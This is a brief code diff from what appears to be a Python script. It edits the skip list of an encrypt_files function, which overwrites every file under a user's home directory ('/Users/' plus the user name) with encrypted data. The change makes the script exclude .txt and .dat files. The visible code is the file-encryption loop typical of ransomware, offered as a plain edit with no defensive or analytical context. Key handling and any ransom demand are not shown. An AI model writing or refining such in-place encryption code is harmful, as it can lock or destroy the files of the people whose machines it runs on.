@@ -25,7 +25,7 @@ def encrypt_files(folder, exclusions):
             with open(file_path, 'wb') as f:
                 f.write(encrypted_data)
 # Specify the exclusions for files/file extensions to be skipped during encryption
-exclusions = []
+exclusions = [".txt", "txt", "dat", ".dat", "DAT", ".DAT"]
 # Replace 'C:/' with the appropriate directory path
 folder_path = '/Users/' + user
 # Call the encrypt_files function
